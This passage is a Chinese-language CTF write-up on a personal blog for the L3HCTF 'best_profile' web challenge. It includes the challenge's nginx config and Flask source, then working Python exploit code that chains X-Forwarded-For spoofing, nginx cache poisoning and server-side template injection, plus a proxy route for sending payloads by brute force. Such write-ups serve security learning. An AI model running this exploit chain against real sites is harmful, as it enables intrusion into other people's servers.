@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>L3HCTF - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="L3HCTF - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/07/12/L3HCTF/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-07-11T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="/" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-07-12T00:00:00+08:00">
+      July 12, 2025
+    </time>
+    
+
+    <h1 class="title">L3HCTF</h1>
+  </div>
+
+  <div class="content">
+    <h2 id="best-profile"><a href="#best-profile" class="headerlink" title="best_profile"></a>best_profile</h2><p>题目给的附件nginx.conf</p>
+<p>这个nginx配置文件的大致意思是nginx开在80端口，会把请求转发给5000端口，gif|jpg|jpeg|png|bmp|swf这类文件会缓存30天，js|css缓存12小时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">worker_processes 1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    use epoll;</span><br><span class="line">    worker_connections 10240;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include mime.types;</span><br><span class="line">    default_type text/html;</span><br><span class="line">    access_log off;</span><br><span class="line">    error_log /dev/null;</span><br><span class="line">    sendfile on;</span><br><span class="line">    keepalive_timeout 65;</span><br><span class="line">    proxy_cache_path /cache levels=1:2 keys_zone=static:20m inactive=24h max_size=100m;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://127.0.0.1:5000;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123;</span><br><span class="line">            proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">            proxy_pass http://127.0.0.1:5000;</span><br><span class="line">            proxy_cache static;</span><br><span class="line">            proxy_cache_valid 200 302 30d;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ .*\.(js|css)?$ &#123;</span><br><span class="line">            proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">            proxy_pass http://127.0.0.1:5000;</span><br><span class="line">            proxy_cache static;</span><br><span class="line">            proxy_cache_valid 200 302 12h;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    render_template_string,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> (</span><br><span class="line">    LoginManager,</span><br><span class="line">    UserMixin,</span><br><span class="line">    login_user,</span><br><span class="line">    login_required,</span><br><span class="line">    logout_user,</span><br><span class="line">    current_user,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> DeclarativeBase</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> Mapped, mapped_column</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> generate_password_hash, check_password_hash</span><br><span class="line"><span class="keyword">from</span> werkzeug.middleware.proxy_fix <span class="keyword">import</span> ProxyFix</span><br><span class="line"><span class="keyword">import</span> geoip2.database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span>(<span class="title class_ inherited__">DeclarativeBase</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(model_class=Base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model, UserMixin):</span><br><span class="line">    <span class="built_in">id</span>: Mapped[<span class="built_in">int</span>] = mapped_column(primary_key=<span class="literal">True</span>)</span><br><span class="line">    username: Mapped[<span class="built_in">str</span>] = mapped_column(unique=<span class="literal">True</span>)</span><br><span class="line">    password: Mapped[<span class="built_in">str</span>] = mapped_column()</span><br><span class="line">    bio: Mapped[<span class="built_in">str</span>] = mapped_column()</span><br><span class="line">    last_ip: Mapped[<span class="built_in">str</span>] = mapped_column(nullable=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_password</span>(<span class="params">self, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.password = generate_password_hash(password)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_password</span>(<span class="params">self, password</span>):</span><br><span class="line">        <span class="keyword">return</span> check_password_hash(<span class="variable language_">self</span>.password, password)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;User %r&gt;&quot;</span> % <span class="variable language_">self</span>.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SQLALCHEMY_DATABASE_URI&quot;</span>] = <span class="string">&quot;sqlite:///data.db&quot;</span></span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line">app.wsgi_app = ProxyFix(app.wsgi_app)</span><br><span class="line"></span><br><span class="line">db.init_app(app)</span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    db.create_all()</span><br><span class="line"></span><br><span class="line">login_manager = LoginManager(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_random_string</span>(<span class="params">length=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random.choices(string.ascii_letters, k=length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>(<span class="params">user_id</span>):</span><br><span class="line">    user = User.query.get(<span class="built_in">int</span>(user_id))</span><br><span class="line">    <span class="keyword">return</span> user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid username or password.&quot;</span></span><br><span class="line">        user = User.query.filter_by(username=username).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user.check_password(password):</span><br><span class="line">            login_user(user)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;route_profile&quot;</span>, username=user.username))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid username or password.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        bio = request.form[<span class="string">&quot;bio&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid username or password.&quot;</span></span><br><span class="line">        user = User.query.filter_by(username=username).first()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Username already exists.&quot;</span></span><br><span class="line">        user = User(username=username, bio=bio)</span><br><span class="line">        user.set_password(password)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;route_login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;string:username&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_profile</span>(<span class="params">username</span>):</span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;profile.html&quot;</span>, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get_last_ip/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_check_ip</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You need to login first.&quot;</span></span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User not found.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;last_ip.html&quot;</span>, last_ip=user.last_ip)</span><br><span class="line"></span><br><span class="line">geoip2_reader = geoip2.database.Reader(<span class="string">&quot;GeoLite2-Country.mmdb&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ip_detail/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_ip_detail</span>(<span class="params">username</span>):</span><br><span class="line">    res = requests.get(<span class="string">f&quot;http://127.0.0.1/get_last_ip/<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Get last ip failed.&quot;</span></span><br><span class="line">    last_ip = res.text</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = re.findall(<span class="string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span>, last_ip)</span><br><span class="line">        country = geoip2_reader.country(ip)</span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        country = <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;IP Detail&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;div&gt;<span class="subst">&#123;last_ip&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Country:<span class="subst">&#123;country&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_last_ip</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        current_user.last_ip = request.remote_addr</span><br><span class="line">        db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;ip_detail&#x2F;&lt;string:username&gt;路由中有个sstil</p>
+<p>由@app.after_request部分可以得知，发完请求后last_ip会自动更新，因为login后会自动跳转至&#x2F;&lt;String:Username&gt;,此时last_ip就会刷新，所以我们要带着恶意X-Forwarded-For访问&lt;String:Username&gt;,这样last_ip就是我们自己可控的了</p>
+<p>但是在浏览器中访问时会自动去访问&#x2F;favicon,这样就会导致ip不可控，所以要写python脚本去发。</p>
+<p>Poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">number = <span class="number">22</span></span><br><span class="line">url1 = <span class="string">&quot;http://127.0.0.1:2121/register&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://127.0.0.1:2121/login&quot;</span></span><br><span class="line">url3 = <span class="string">f&quot;http://127.0.0.1:2121/<span class="subst">&#123;number&#125;</span>.js&quot;</span></span><br><span class="line">url4 = <span class="string">f&quot;http://127.0.0.1:2121/get_last_ip/<span class="subst">&#123;number&#125;</span>.js&quot;</span></span><br><span class="line">url5 = <span class="string">f&quot;http://127.0.0.1:2121/ip_detail/<span class="subst">&#123;number&#125;</span>.js&quot;</span></span><br><span class="line">req1 = requests.post(url1,headers=&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,data=<span class="string">f&quot;username=<span class="subst">&#123;number&#125;</span>.js&amp;password=<span class="subst">&#123;number&#125;</span>&amp;bio=<span class="subst">&#123;number&#125;</span>&amp;submit=Sign+Up&quot;</span>)</span><br><span class="line">req2 = requests.post(url2,headers=&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,data=<span class="string">f&quot;username=<span class="subst">&#123;number&#125;</span>.js&amp;password=<span class="subst">&#123;number&#125;</span>&amp;submit=Log+In&quot;</span>,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(req2.status_code)</span><br><span class="line">session_cookie = req2.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(session_cookie)</span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;2+2&#125;&#125;&quot;</span></span><br><span class="line">req3 = requests.get(url3,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:session_cookie,<span class="string">&quot;X-Forwarded-For&quot;</span>:payload&#125;)</span><br><span class="line">req4 = requests.get(url4,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:session_cookie&#125;)</span><br><span class="line"><span class="built_in">print</span>(req4.text)</span><br><span class="line">req5 =  requests.get(url5,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:session_cookie&#125;)</span><br><span class="line"><span class="built_in">print</span>(req5.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是用普通的用户名会返回you need to login ,我猜测是因为&#x2F;ip_detail路由访问get_last_ip没有带cookie</p>
+<p>但nginx配置文件中写到会将js,css后缀文件缓存12h，png缓存30d,所以可以把用户名改成以js,css,png这些结尾，这样ip_detail访问get_last_ip就会从缓存里面去读取之前我们访问过的&#x2F;get_last_ip&#x2F;1.js返回的响应,这样就不会经过后端也就不会返回you need to login first</p>
+<p>但后端和我的浏览器明明是两个客户端，nginx会把我访问返回的response直接返回给后端吗？</p>
+<p>ai告诉我默认情况下nginx的缓存是全局缓存，不是针对某个客户端的私有缓存，也就是说：</p>
+<blockquote>
+<p><strong>只要路径一样、请求条件匹配，nginx 就可能将之前某个客户端访问产生的响应，直接返回给下一个客户端——包括 Flask 后端的 <code>requests.get()</code></strong></p>
+</blockquote>
+<p>写个转接头爆破一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/dashing&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashing</span>():</span><br><span class="line">    bug = request.args.get(<span class="string">&quot;bug&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> number</span><br><span class="line">    number += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(number)</span><br><span class="line">    url1 = <span class="string">&quot;http://127.0.0.1:2121/register&quot;</span></span><br><span class="line">    url2 = <span class="string">&quot;http://127.0.0.1:2121/login&quot;</span></span><br><span class="line">    url3 = <span class="string">f&quot;http://127.0.0.1:2121/<span class="subst">&#123;number&#125;</span>.png&quot;</span></span><br><span class="line">    url4 = <span class="string">f&quot;http://127.0.0.1:2121/get_last_ip/<span class="subst">&#123;number&#125;</span>.png&quot;</span></span><br><span class="line">    url5 = <span class="string">f&quot;http://127.0.0.1:2121/ip_detail/<span class="subst">&#123;number&#125;</span>.png&quot;</span></span><br><span class="line">    req1 = requests.post(url1, headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;, data=<span class="string">f&quot;username=<span class="subst">&#123;number&#125;</span>.png&amp;password=<span class="subst">&#123;number&#125;</span>&amp;bio=<span class="subst">&#123;number&#125;</span>&amp;submit=Sign+Up&quot;</span>)</span><br><span class="line">    req2 = requests.post(url2, headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;, data=<span class="string">f&quot;username=<span class="subst">&#123;number&#125;</span>.png&amp;password=<span class="subst">&#123;number&#125;</span>&amp;submit=Log+In&quot;</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    session_cookie = req2.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>)</span><br><span class="line">    req3 = requests.get(url3, headers=&#123;<span class="string">&quot;Cookie&quot;</span>: session_cookie, <span class="string">&quot;X-Forwarded-For&quot;</span>: bug&#125;)</span><br><span class="line">    req4 = requests.get(url4, headers=&#123;<span class="string">&quot;Cookie&quot;</span>: session_cookie&#125;)</span><br><span class="line">    req5 = requests.get(url5, headers=&#123;<span class="string">&quot;Cookie&quot;</span>: session_cookie&#125;)</span><br><span class="line">    <span class="built_in">print</span>(req5.text)</span><br><span class="line">    <span class="keyword">if</span> req5.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;fail&quot;</span>,<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> req5.text</span><br><span 